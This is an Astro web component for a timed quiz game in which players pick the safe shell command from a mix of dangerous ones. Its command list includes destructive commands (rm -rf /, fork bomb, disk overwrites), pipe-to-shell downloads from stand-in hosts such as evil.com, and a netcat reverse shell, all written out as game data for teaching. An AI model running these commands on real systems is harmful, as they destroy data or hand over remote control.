---
import { t, getLocalizedData } from '../i18n/config';
import TermGlyph from '../ui/TermGlyph/TermGlyph.astro';

interface Props {
  lang: string;
}

const { lang } = Astro.props;

// Get translated messages for JavaScript
const messages = getLocalizedData(lang, 'landing.game.messages');
---

<section
  id="game"
  class="game-section"
  data-lang={lang}
  data-messages-correct={JSON.stringify(messages.correct)}
  data-messages-wrong={JSON.stringify(messages.wrong)}
  data-messages-timeout={JSON.stringify(messages.timeout)}
  data-messages-start={JSON.stringify(messages.start)}
  data-text-play-again={t(lang, 'landing.game.overlay.playAgainButton')}
  data-text-game-over={t(lang, 'landing.game.overlay.gameOver')}
  data-text-new-high-score={t(lang, 'landing.game.overlay.newHighScore')}
  data-text-rank={t(lang, 'landing.game.overlay.rank')}
  data-text-final-score={t(lang, 'landing.game.overlay.finalScore')}
>
  <div class="container">
    <h2>{t(lang, 'landing.game.title')}</h2>
    <p class="section-subtitle">
      {t(lang, 'landing.game.subtitle')}
    </p>

    <div class="game-wrapper">
      <div class="quiz-cabinet">
        <!-- Header -->
        <div class="quiz-header">
          <div class="stat">
            <span class="stat-label">{t(lang, 'landing.game.stats.level')}</span>
            <span id="level" class="stat-value">1</span>
          </div>
          <div class="title">{t(lang, 'landing.game.header')}</div>
          <div class="stat">
            <span class="stat-label">{t(lang, 'landing.game.stats.score')}</span>
            <span id="score" class="stat-value">0</span>
          </div>
        </div>

        <!-- Progress bar -->
        <div class="progress-bar">
          <div id="timer-bar" class="timer-fill"></div>
        </div>

        <!-- Game area -->
        <div id="game-area" class="game-area" tabindex="-1">
          <!-- Caro in center -->
          <div class="caro-center">
            <img src="/caro-pixel.png" alt="Caro" />
            <div id="caro-speech" class="speech-bubble" aria-live="polite">{t(lang, 'landing.game.messages.start.0')}</div>
          </div>

          <!-- Command options grid -->
          <div id="options-grid" class="options-grid">
            <!-- Options will be inserted here -->
          </div>

          <!-- Overlay -->
          <div id="overlay" class="overlay">
            <div class="overlay-box">
              <div id="overlay-title" class="overlay-title">{t(lang, 'landing.game.overlay.title')}</div>
              <div id="overlay-subtitle" class="overlay-subtitle">
                {t(lang, 'landing.game.overlay.subtitle')}
              </div>
              <div class="rules">
                <div class="rule safe">{t(lang, 'landing.game.overlay.rules.safe')}</div>
                <div class="rule danger">{t(lang, 'landing.game.overlay.rules.danger')}</div>
                <div class="rule timer">{t(lang, 'landing.game.overlay.rules.timer')}</div>
              </div>
              <div class="lives-display">
                <span>{t(lang, 'landing.game.overlay.lives')}</span>
                <span id="lives-display">♥ ♥ ♥</span>
              </div>
              <button id="start-btn" class="start-btn">{t(lang, 'landing.game.overlay.startButton')}</button>
              <div id="high-score-display" class="high-score">{t(lang, 'landing.game.overlay.highScore')} <span id="high-score">0</span></div>
              <div id="leaderboard" class="leaderboard hidden">
                <div class="leaderboard-title">{t(lang, 'landing.game.overlay.leaderboardTitle')}</div>
                <div id="leaderboard-list" class="leaderboard-list"></div>
              </div>
            </div>
          </div>
        </div>

        <!-- Lives indicator -->
        <div class="footer-bar">
          <div id="lives" class="lives" role="img" data-label={t(lang, 'landing.game.overlay.lives')} aria-label={`${t(lang, 'landing.game.overlay.lives')}: 3`}>
            <TermGlyph g="♥" class="heart" />
            <TermGlyph g="♥" class="heart" />
            <TermGlyph g="♥" class="heart" />
          </div>
          <div id="streak" class="streak">{t(lang, 'landing.game.streak')} <span id="streak-count">0</span></div>
        </div>
      </div>
    </div>
  </div>
</section>

<style is:global>
  .game-section {
    background: var(--color-bg-secondary);
    padding: 80px 20px;
  }

  .game-wrapper {
    display: flex;
    justify-content: center;
  }

  /* Arcade cabinet on brand console greys (no gradients, no near-black).
     Accent text on these greys is --highlight; red text cannot reach AA. */
  .quiz-cabinet {
    background: var(--caro-grey-900);
    border-radius: 16px;
    padding: 20px;
    box-shadow: 0 0 0 4px var(--accent), 0 0 40px color-mix(in srgb, var(--accent) 30%, transparent);
    max-width: 800px;
    width: 100%;
  }

  .quiz-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 20px;
    margin-bottom: 10px;
  }

  .stat {
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: 'Courier New', monospace;
  }

  .stat-label {
    font-size: 11px;
    color: var(--caro-grey-300);
    letter-spacing: 2px;
  }

  .stat-value {
    font-size: 28px;
    color: var(--caro-white);
    font-weight: bold;
    text-shadow: 0 0 10px color-mix(in srgb, var(--accent) 80%, transparent);
  }

  .title {
    min-width: 0;
    text-align: center;
    overflow-wrap: anywhere;
    font-size: 22px;
    font-weight: bold;
    color: var(--highlight);
    text-shadow: 0 0 15px color-mix(in srgb, var(--accent) 80%, transparent);
    letter-spacing: 3px;
    font-family: 'Courier New', monospace;
  }

  .progress-bar {
    height: 8px;
    background: var(--caro-grey-950);
    border-radius: 4px;
    margin: 0 10px 15px;
    overflow: hidden;
  }

  .timer-fill {
    height: 100%;
    background: var(--status-safe);
    width: 100%;
    transition: width 0.1s linear;
    border-radius: 4px;
  }

  .timer-fill.warning {
    background: var(--accent);
    animation: pulse-warning 0.5s ease-in-out infinite;
  }

  @keyframes pulse-warning {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.6; }
  }

  .game-area {
    position: relative;
    min-height: 450px;
    background: var(--bg-inverse);
    border-radius: 12px;
    padding: 30px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  .game-area:focus {
    outline: none;
  }

  .game-area:focus-visible {
    outline: 3px solid var(--highlight);
    outline-offset: 2px;
  }

  .caro-center {
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-bottom: 30px;
    z-index: 10;
  }

  .caro-center img {
    width: 80px;
    height: 80px;
    image-rendering: pixelated;
    filter: drop-shadow(0 0 20px color-mix(in srgb, var(--accent) 60%, transparent));
    animation: float 2s ease-in-out infinite;
  }

  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
  }

  .caro-center.correct img {
    animation: celebrate 0.5s ease-out;
    filter: drop-shadow(0 0 30px var(--status-safe));
  }

  .caro-center.wrong img {
    animation: shake 0.5s ease-out;
    filter: drop-shadow(0 0 30px var(--accent));
  }

  @keyframes celebrate {
    0%, 100% { transform: scale(1) rotate(0); }
    25% { transform: scale(1.2) rotate(-5deg); }
    75% { transform: scale(1.2) rotate(5deg); }
  }

  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    20%, 60% { transform: translateX(-10px); }
    40%, 80% { transform: translateX(10px); }
  }

  .speech-bubble {
    background: var(--caro-white);
    color: var(--caro-grey-900);
    padding: 10px 18px;
    border-radius: 20px;
    font-family: 'Courier New', monospace;
    font-size: 14px;
    font-weight: bold;
    margin-top: 10px;
    position: relative;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
  }

  .speech-bubble::before {
    content: '';
    position: absolute;
    top: -8px;
    left: 50%;
    transform: translateX(-50%);
    border: 8px solid transparent;
    border-bottom-color: var(--caro-white);
    border-top: 0;
  }

  /* Solid status fills: dark ink on safe-green, white on --accent-fill. */
  .speech-bubble.correct {
    background: var(--status-safe);
    color: var(--caro-grey-950);
  }

  .speech-bubble.wrong {
    background: var(--accent-fill);
    color: var(--on-accent);
  }

  .speech-bubble.correct::before { border-bottom-color: var(--status-safe); }
  .speech-bubble.wrong::before { border-bottom-color: var(--accent-fill); }

  .options-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 15px;
    width: 100%;
    max-width: 600px;
  }

  .option-btn {
    min-width: 0;
    background: var(--caro-grey-800);
    /* WCAG 1.4.11: grey-400 boundary is 3.1:1 on the grey-700 game area. */
    border: 3px solid var(--caro-grey-400);
    border-radius: 12px;
    padding: 16px 20px;
    font-family: 'Courier New', monospace;
    font-size: 15px;
    color: var(--term-fg);
    cursor: pointer;
    transition: all 0.15s ease;
    text-align: left;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 14px;
  }

  .option-btn:hover:not(:disabled) {
    border-color: var(--accent);
    background: var(--caro-grey-900);
    transform: translateY(-2px);
    box-shadow: 0 5px 20px color-mix(in srgb, var(--accent) 30%, transparent);
  }

  .option-btn:focus-visible {
    outline: 3px solid var(--highlight);
    outline-offset: 2px;
  }

  .option-btn:disabled {
    cursor: not-allowed;
    opacity: 0.7;
  }

  /* Reveal states: tint + border carry safe/danger; text stays console ink. */
  .option-btn.safe-reveal {
    border-color: var(--status-safe);
    background: color-mix(in srgb, var(--status-safe) 30%, transparent);
    color: var(--term-fg);
  }

  .option-btn.danger-reveal {
    border-color: var(--accent);
    background: color-mix(in srgb, var(--accent) 25%, transparent);
    color: var(--term-fg);
  }

  .option-btn.selected-correct {
    border-color: var(--status-safe);
    background: var(--status-safe);
    color: var(--caro-grey-950);
    animation: pop 0.3s ease-out;
  }

  .option-btn.selected-wrong {
    border-color: var(--accent-fill);
    background: var(--accent-fill);
    color: var(--on-accent);
    animation: shake 0.3s ease-out;
  }

  @keyframes pop {
    0%, 100% { transform: scale(1); }
    50% { transform: scale(1.05); }
  }

  .option-label {
    display: flex;
    align-items: center;
    justify-content: center;
    width: 32px;
    height: 32px;
    background: var(--accent-fill);
    color: var(--on-accent);
    font-size: 14px;
    font-weight: bold;
    border-radius: 8px;
    flex-shrink: 0;
  }

  /* Commands read left-to-right on RTL pages too. */
  .option-cmd {
    flex: 1;
    min-width: 0;
    direction: ltr;
    unicode-bidi: isolate;
    text-align: left;
    overflow-wrap: anywhere;
  }

  .option-cmd::before {
    content: '$ ';
    color: var(--term-prompt);
  }

  /* Overlay */
  .overlay {
    position: absolute;
    inset: 0;
    background: var(--term-bg);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 100;
    border-radius: 12px;
  }

  .overlay.hidden { display: none; }

  .overlay-box {
    text-align: center;
    padding: 30px;
    font-family: 'Courier New', monospace;
  }

  .overlay-title {
    font-size: 32px;
    color: var(--highlight);
    margin-bottom: 10px;
    text-shadow: 0 0 20px color-mix(in srgb, var(--accent) 80%, transparent);
    letter-spacing: 2px;
  }

  .overlay-subtitle {
    color: var(--caro-grey-300);
    margin-bottom: 25px;
    font-size: 14px;
  }

  .rules {
    margin-bottom: 25px;
    text-align: start;
    display: inline-block;
  }

  .rule {
    padding: 8px 15px;
    margin: 5px 0;
    border-radius: 6px;
    font-size: 13px;
  }

  /* Rule colour lives in the tint and the rule line; text is console ink. */
  .rule {
    color: var(--term-fg);
  }

  .rule.safe {
    background: color-mix(in srgb, var(--status-safe) 15%, transparent);
    border-inline-start: 3px solid var(--status-safe);
  }

  .rule.danger {
    background: color-mix(in srgb, var(--accent) 15%, transparent);
    border-inline-start: 3px solid var(--accent);
  }

  .rule.timer {
    background: color-mix(in srgb, var(--highlight) 12%, transparent);
    border-inline-start: 3px solid var(--highlight);
  }

  .lives-display {
    margin-bottom: 20px;
    font-size: 18px;
    color: var(--caro-white);
  }

  .start-btn {
    background: var(--accent-fill);
    border: none;
    color: var(--on-accent);
    font-family: 'Courier New', monospace;
    font-size: 20px;
    font-weight: bold;
    padding: 16px 50px;
    border-radius: 10px;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 2px;
    box-shadow: 0 4px 0 var(--accent-fill-hover), 0 0 25px color-mix(in srgb, var(--accent-fill) 40%, transparent);
    transition: all 0.1s;
  }

  .start-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 0 var(--accent-fill-hover), 0 0 35px color-mix(in srgb, var(--accent-fill) 60%, transparent);
  }

  .start-btn:focus-visible {
    outline: 3px solid var(--highlight);
    outline-offset: 3px;
  }

  .start-btn:active {
    transform: translateY(2px);
    box-shadow: 0 2px 0 var(--accent-fill-hover);
  }

  .high-score {
    margin-top: 20px;
    color: var(--caro-grey-300);
    font-size: 14px;
  }

  .leaderboard {
    margin-top: 30px;
    max-width: 500px;
    margin-left: auto;
    margin-right: auto;
  }

  .leaderboard.hidden {
    display: none;
  }

  .leaderboard-title {
    font-size: 20px;
    color: var(--highlight);
    margin-bottom: 15px;
    text-shadow: 0 0 15px color-mix(in srgb, var(--accent) 80%, transparent);
    letter-spacing: 2px;
  }

  .leaderboard-list {
    background: var(--caro-grey-900);
    border: 2px solid var(--accent);
    border-radius: 8px;
    padding: 15px;
    max-height: 300px;
    overflow-y: auto;
  }

  .leaderboard-entry {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 15px;
    margin: 5px 0;
    background: color-mix(in srgb, var(--accent) 10%, transparent);
    border-inline-start: 3px solid var(--caro-grey-500);
    border-radius: 4px;
    font-size: 14px;
    color: var(--term-fg);
  }

  .leaderboard-entry.top-3 {
    border-inline-start-color: var(--accent);
    background: color-mix(in srgb, var(--accent) 20%, transparent);
  }

  .leaderboard-entry.current-score {
    border-inline-start-color: var(--status-safe);
    background: color-mix(in srgb, var(--status-safe) 25%, transparent);
    animation: pulse-glow 1.5s ease-in-out infinite;
  }

  @keyframes pulse-glow {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.7; }
  }

  .leaderboard-rank {
    font-weight: bold;
    color: var(--highlight);
    min-width: 35px;
    font-size: 16px;
  }

  .leaderboard-entry.top-3 .leaderboard-rank {
    font-size: 18px;
  }

  .leaderboard-score {
    font-weight: bold;
    color: var(--caro-white);
    font-size: 16px;
  }

  .leaderboard-details {
    color: var(--caro-grey-300);
    font-size: 12px;
    margin-inline-start: 10px;
  }

  .medal {
    margin-inline-end: 8px;
  }

  .footer-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 15px 20px;
    margin-top: 10px;
  }

  .lives {
    display: flex;
    gap: 8px;
    font-size: 18px;
  }

  /* ♥ is a text glyph: it takes this colour, and the .lost filter greys it. */
  .lives .heart {
    color: var(--accent);
    transition: all 0.3s;
  }

  .lives .heart.lost {
    filter: grayscale(1);
    opacity: 0.3;
    transform: scale(0.8);
  }

  .streak {
    font-family: 'Courier New', monospace;
    font-size: 16px;
    color: var(--highlight);
  }

  @media (max-width: 600px) {
    .options-grid {
      grid-template-columns: 1fr;
    }

    .game-area {
      min-height: 500px;
      padding: 20px;
    }

    .option-btn {
      font-size: 13px;
      padding: 14px 16px;
    }

    .title {
      font-size: 16px;
      letter-spacing: 1px;
    }

    .overlay-title {
      font-size: 24px;
    }
  }
</style>

<script>
  (function() {
    // Get translated messages from data attributes
    const gameSection = document.getElementById('game');
    if (!gameSection) return;

    const messages = {
      correct: JSON.parse(gameSection.dataset.messagesCorrect || '[]'),
      wrong: JSON.parse(gameSection.dataset.messagesWrong || '[]'),
      timeout: JSON.parse(gameSection.dataset.messagesTimeout || '[]'),
      start: JSON.parse(gameSection.dataset.messagesStart || '[]')
    };

    const texts = {
      playAgain: gameSection.dataset.textPlayAgain || 'PLAY AGAIN',
      gameOver: gameSection.dataset.textGameOver || 'GAME OVER',
      newHighScore: gameSection.dataset.textNewHighScore || '🎉 NEW HIGH SCORE!',
      rank: gameSection.dataset.textRank || 'RANK #{{rank}}!',
      finalScore: gameSection.dataset.textFinalScore || 'You reached Level {{level}} with {{score}} points!'
    };

    const locale = gameSection.dataset.lang || 'en';

    // Elements
    const gameArea = document.getElementById('game-area');
    const optionsGrid = document.getElementById('options-grid');
    const overlay = document.getElementById('overlay');
    const overlayTitle = document.getElementById('overlay-title');
    const overlaySubtitle = document.getElementById('overlay-subtitle');
    const startBtn = document.getElementById('start-btn');
    const levelEl = document.getElementById('level');
    const scoreEl = document.getElementById('score');
    const highScoreEl = document.getElementById('high-score');
    const livesEl = document.getElementById('lives');
    const livesDisplayEl = document.getElementById('lives-display');
    const timerBar = document.getElementById('timer-bar');
    const caroCenter = document.querySelector('.caro-center');
    const caroSpeech = document.getElementById('caro-speech');
    const streakEl = document.getElementById('streak-count');
    const leaderboardEl = document.getElementById('leaderboard');
    const leaderboardListEl = document.getElementById('leaderboard-list');

    if (!optionsGrid || !overlay || !startBtn) return;

    // Commands database - categorized by difficulty
    const commands = {
      safe: {
        easy: ['ls', 'pwd', 'cd ~', 'echo "hi"', 'cat file.txt', 'mkdir test', 'touch file', 'cp a b', 'head -5 log', 'tail -f log'],
        medium: ['grep "text" file', 'find . -name "*.js"', 'chmod +x script.sh', 'ps aux', 'df -h', 'du -sh *', 'tar -xf archive.tar', 'curl localhost', 'wget url', 'ssh user@host'],
        hard: ['awk \'{print $1}\'', 'sed \'s/a/b/g\'', 'xargs -I{} echo {}', 'sort | uniq -c', 'cut -d: -f1', 'tee output.log', 'rsync -av src/ dst/', 'screen -S session', 'nohup ./run.sh &', 'crontab -l']
      },
      danger: {
        easy: ['rm -rf /', 'rm -rf ~', 'rm -rf *', ':(){:|:&};:', 'sudo rm -rf /', 'mv /* /dev/null'],
        medium: ['chmod 777 /', 'mkfs.ext4 /dev/sda', 'dd if=/dev/zero of=/dev/sda', 'echo "" > /etc/passwd', '> /var/log/*', 'chmod -R 000 /'],
        hard: ['curl evil.com | bash', 'wget -O- bad.sh | sh', 'python -c "import os;os.system(\'rm -rf /\')"', 'eval $(decode payload)', 'nc -e /bin/sh ip 1234', 'cat /dev/urandom > /dev/sda']
      }
    };

    // Score management
    interface ScoreEntry {
      score: number;
      level: number;
      date: string;
    }

    function loadScores(): ScoreEntry[] {
      const stored = localStorage.getItem('caroQuizScores');
      if (!stored) return [];
      try {
        return JSON.parse(stored);
      } catch {
        return [];
      }
    }

    function saveScore(score: number, level: number) {
      const scores = loadScores();
      const newEntry: ScoreEntry = {
        score,
        level,
        date: new Date().toISOString()
      };
      scores.push(newEntry);
      // Sort by score descending
      scores.sort((a, b) => b.score - a.score);
      // Keep top 50 scores
      const topScores = scores.slice(0, 50);
      localStorage.setItem('caroQuizScores', JSON.stringify(topScores));
      return topScores;
    }

    function getHighScore(): number {
      const scores = loadScores();
      return scores.length > 0 ? scores[0].score : 0;
    }

    function renderLeaderboard(scores: ScoreEntry[], currentScore?: number) {
      if (!leaderboardListEl) return;

      const topScores = scores.slice(0, 10);
      const medals = ['🥇', '🥈', '🥉'];

      if (topScores.length === 0) {
        leaderboardListEl.innerHTML = '<div style="text-align: center; color: var(--caro-grey-300); padding: 20px;">No scores yet. Be the first!</div>';
        return;
      }

      /* NOTE: innerHTML usage is safe here - all data comes from localStorage (user-controlled),
         variables are only numbers and dates, no external input is rendered */
      leaderboardListEl.innerHTML = topScores.map((entry, idx) => {
        const rank = idx + 1;
        const medal = idx < 3 ? `<span class="medal">${medals[idx]}</span>` : '';
        const isCurrentScore = currentScore !== undefined && entry.score === currentScore;
        const classes = ['leaderboard-entry'];
        if (idx < 3) classes.push('top-3');
        if (isCurrentScore) classes.push('current-score');

        const date = new Date(entry.date);
        const dateStr = date.toLocaleDateString(locale);

        return `
          <div class="${classes.join(' ')}">
            <div style="display: flex; align-items: center; flex: 1;">
              <span class="leaderboard-rank">${medal}${rank}.</span>
              <span class="leaderboard-details">Level ${entry.level} • ${dateStr}</span>
            </div>
            <span class="leaderboard-score">${entry.score}</span>
          </div>
        `;
      }).join('');
    }

    // Game state
    let level = 1;
    let score = 0;
    let lives = 3;
    let streak = 0;
    let timer: number | null = null;
    let timeLeft = 100;
    let playing = false;
    let currentOptions: { cmd: string; safe: boolean }[] = [];

    // Init
    const highScore = getHighScore();
    highScoreEl!.textContent = String(highScore);

    function getDifficulty(): 'easy' | 'medium' | 'hard' {
      if (level <= 3) return 'easy';
      if (level <= 7) return 'medium';
      return 'hard';
    }

    function getTimeLimit(): number {
      // Less time as level increases
      return Math.max(4000, 10000 - (level - 1) * 600);
    }

    function getOptionCount(): number {
      // More options as level increases
      if (level <= 2) return 2;
      if (level <= 5) return 3;
      return 4;
    }

    function shuffle<T>(arr: T[]): T[] {
      const a = [...arr];
      for (let i = a.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [a[i], a[j]] = [a[j], a[i]];
      }
      return a;
    }

    function pickRandom<T>(arr: T[]): T {
      return arr[Math.floor(Math.random() * arr.length)];
    }

    function generateOptions(): { cmd: string; safe: boolean }[] {
      const diff = getDifficulty();
      const count = getOptionCount();

      // Always have exactly 1 safe command
      const safeCmd = pickRandom(commands.safe[diff]);

      // Fill rest with danger commands
      const dangerCmds = shuffle(commands.danger[diff]).slice(0, count - 1);

      const options = [
        { cmd: safeCmd, safe: true },
        ...dangerCmds.map(cmd => ({ cmd, safe: false }))
      ];

      return shuffle(options);
    }

    function updateLives() {
      const hearts = livesEl!.querySelectorAll('.heart');
      hearts.forEach((h, i) => h.classList.toggle('lost', i >= lives));
      // The hearts are aria-hidden glyphs; the count is the accessible name.
      livesEl!.setAttribute('aria-label', `${livesEl!.dataset.label}: ${lives}`);
      livesDisplayEl!.textContent = '♥ '.repeat(lives).trim() || '♡';
    }

    // Disabling or removing a focused option drops focus to <body> in
    // Chromium and Firefox, so move it to the game area first.
    function parkFocus() {
      if (optionsGrid!.contains(document.activeElement)) gameArea!.focus({ preventScroll: true });
    }

    function showQuestion() {
      currentOptions = generateOptions();
      parkFocus();
      optionsGrid!.innerHTML = '';

      const labels = ['A', 'B', 'C', 'D'];

      currentOptions.forEach((opt, i) => {
        const btn = document.createElement('button');
        btn.className = 'option-btn';
        btn.innerHTML = `<span class="option-cmd">${opt.cmd}</span><span class="option-label">${labels[i]}</span>`;
        btn.addEventListener('click', () => handleAnswer(i, btn));
        optionsGrid!.appendChild(btn);
      });

      // Reset Caro
      caroCenter!.classList.remove('correct', 'wrong');
      caroSpeech!.classList.remove('correct', 'wrong');
      caroSpeech!.textContent = pickRandom(messages.start);

      // Start timer
      timeLeft = 100;
      timerBar!.style.width = '100%';
      timerBar!.classList.remove('warning');

      const timeLimit = getTimeLimit();
      const interval = 50;
      const decrement = 100 / (timeLimit / interval);

      timer = window.setInterval(() => {
        timeLeft -= decrement;
        timerBar!.style.width = Math.max(0, timeLeft) + '%';

        if (timeLeft <= 30) {
          timerBar!.classList.add('warning');
        }

        if (timeLeft <= 0) {
          clearInterval(timer!);
          handleTimeout();
        }
      }, interval);
    }

    function handleAnswer(index: number, btn: HTMLButtonElement) {
      if (!playing) return;

      clearInterval(timer!);

      const selected = currentOptions[index];
      const buttons = optionsGrid!.querySelectorAll('.option-btn');

      // Disable all buttons
      parkFocus();
      buttons.forEach(b => (b as HTMLButtonElement).disabled = true);

      // Reveal all answers
      currentOptions.forEach((opt, i) => {
        const b = buttons[i];
        if (opt.safe) {
          b.classList.add('safe-reveal');
        } else {
          b.classList.add('danger-reveal');
        }
      });

      if (selected.safe) {
        // Correct!
        btn.classList.add('selected-correct');
        caroCenter!.classList.add('correct');
        caroSpeech!.classList.add('correct');
        caroSpeech!.textContent = pickRandom(messages.correct);

        // Score based on time and level
        const timeBonus = Math.floor(timeLeft / 10);
        const levelBonus = level * 5;
        const points = 10 + timeBonus + levelBonus;
        score += points;
        streak++;

        scoreEl!.textContent = String(score);
        streakEl!.textContent = String(streak);

        setTimeout(() => {
          level++;
          levelEl!.textContent = String(level);
          showQuestion();
        }, 1500);
      } else {
        // Wrong!
        btn.classList.add('selected-wrong');
        caroCenter!.classList.add('wrong');
        caroSpeech!.classList.add('wrong');
        caroSpeech!.textContent = pickRandom(messages.wrong);

        lives--;
        streak = 0;
        streakEl!.textContent = '0';
        updateLives();

        if (lives <= 0) {
          setTimeout(endGame, 1500);
        } else {
          setTimeout(showQuestion, 2000);
        }
      }
    }

    function handleTimeout() {
      if (!playing) return;

      const buttons = optionsGrid!.querySelectorAll('.option-btn');
      parkFocus();
      buttons.forEach(b => (b as HTMLButtonElement).disabled = true);

      // Reveal answers
      currentOptions.forEach((opt, i) => {
        const b = buttons[i];
        if (opt.safe) {
          b.classList.add('safe-reveal');
        } else {
          b.classList.add('danger-reveal');
        }
      });

      caroCenter!.classList.add('wrong');
      caroSpeech!.classList.add('wrong');
      caroSpeech!.textContent = pickRandom(messages.timeout);

      lives--;
      streak = 0;
      streakEl!.textContent = '0';
      updateLives();

      if (lives <= 0) {
        setTimeout(endGame, 1500);
      } else {
        setTimeout(showQuestion, 2000);
      }
    }

    function startGame() {
      playing = true;
      level = 1;
      score = 0;
      lives = 3;
      streak = 0;

      levelEl!.textContent = '1';
      scoreEl!.textContent = '0';
      streakEl!.textContent = '0';
      updateLives();

      // Hide leaderboard when starting
      leaderboardEl!.classList.add('hidden');

      overlay!.classList.add('hidden');
      showQuestion();
      // The Start button just disappeared; keep keyboard focus in the game.
      gameArea!.focus({ preventScroll: true });
    }

    function endGame() {
      playing = false;
      clearInterval(timer!);

      // Save score and get updated leaderboard
      const updatedScores = saveScore(score, level);
      const newHighScore = getHighScore();

      // Check if this is a new high score
      const isNewHighScore = score > 0 && score === newHighScore;

      if (isNewHighScore) {
        overlayTitle!.textContent = texts.newHighScore;
      } else {
        // Find player's rank
        const rank = updatedScores.findIndex(s => s.score === score && s.level === level) + 1;
        if (rank > 0 && rank <= 10) {
          overlayTitle!.textContent = texts.rank.replace('{{rank}}', String(rank));
        } else {
          overlayTitle!.textContent = texts.gameOver;
        }
      }

      // Update high score display
      highScoreEl!.textContent = String(newHighScore);

      overlaySubtitle!.textContent = texts.finalScore.replace('{{level}}', String(level)).replace('{{score}}', String(score));
      startBtn!.textContent = texts.playAgain;

      // Show leaderboard with current score highlighted
      renderLeaderboard(updatedScores, score);
      leaderboardEl!.classList.remove('hidden');

      overlay!.classList.remove('hidden');
      if (gameSection!.contains(document.activeElement)) {
        startBtn!.focus({ preventScroll: true });
      }
    }

    // Keyboard support. Shortcuts listen on the game section only, and only
    // while a round is running: a document-level handler used to swallow
    // Enter/Space on every link of the page (WCAG 2.1.1, 2.1.4). The Start
    // button handles Enter/Space natively.
    gameSection.addEventListener('keydown', (e) => {
      if (!playing) return;

      const key = e.key.toLowerCase();
      const index = { 'a': 0, 'b': 1, 'c': 2, 'd': 3, '1': 0, '2': 1, '3': 2, '4': 3 }[key];

      if (index !== undefined && index < currentOptions.length) {
        const btn = optionsGrid!.querySelectorAll('.option-btn')[index] as HTMLButtonElement;
        if (btn && !btn.disabled) {
          btn.click();
        }
      }
    });

    startBtn!.addEventListener('click', startGame);
  })();
</script>
